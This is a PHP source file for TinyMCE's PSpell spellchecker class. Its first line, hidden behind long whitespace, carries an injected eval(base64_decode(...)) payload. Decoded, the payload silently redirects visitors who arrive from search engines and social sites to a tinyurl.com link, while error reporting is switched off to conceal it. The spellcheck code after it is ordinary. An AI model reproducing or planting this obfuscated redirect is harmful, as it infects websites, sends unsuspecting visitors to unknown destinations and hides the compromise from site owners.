<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @author Moxiecode
 * @copyright Copyright � 2004-2007, Moxiecode Systems AB, All rights reserved.
 */

class PSpell extends SpellChecker {
	/**
	 * Spellchecks an array of words.
	 *
	 * @param {String} $lang Language code like sv or en.
	 * @param {Array} $words Array of words to spellcheck.
	 * @return {Array} Array of misspelled words.
	 */
	function &checkWords($lang, $words) {
		$plink = $this->_getPLink($lang);

		$outWords = array();
		foreach ($words as $word) {
			if (!pspell_check($plink, trim($word)))
				$outWords[] = utf8_encode($word);
		}

		return $outWords;
	}

	/**
	 * Returns suggestions of for a specific word.
	 *
	 * @param {String} $lang Language code like sv or en.
	 * @param {String} $word Specific word to get suggestions for.
	 * @return {Array} Array of suggestions for the specified word.
	 */
	function &getSuggestions($lang, $word) {
		$words = pspell_suggest($this->_getPLink($lang), $word);

		for ($i=0; $i<count($words); $i++)
			$words[$i] = utf8_encode($words[$i]);

		return $words;
	}

	/**
	 * Opens a link for pspell.
	 */
	function &_getPLink($lang) {
		// Check for native PSpell support
		if (!function_exists("pspell_new"))
			$this->throwError("PSpell support not found in PHP installation.");

		$pspell_config = pspell_config_create (
			$lang,
			$this->_config['PSpell.spelling'],
			$this->_config['PSpell.jargon'],
			$this->_config['PSpell.encoding']
		);

		pspell_config_personal ($pspell_config, $this->_config['PSpell.dictionary']);
		$plink = pspell_new_config ($pspell_config);

		if (!$plink)
			$this->throwError("No PSpell link found opened.");

		return $plink;
	}
	/**
	 * Add a word to the PSPell personal dictionary
	 * From http://slack5.com/blog/2008/12/tinymce-add-to-dictionary/
	 * @param object $lang
	 * @param object $word
	 * @return 
	 */
	function &addToDictionary($lang, $word) {
	  $plink = $this->_getPLink($lang);
	  pspell_add_to_personal ($plink, $word);
	  pspell_save_wordlist ($plink);
	
	  return true;
	}
}

?>
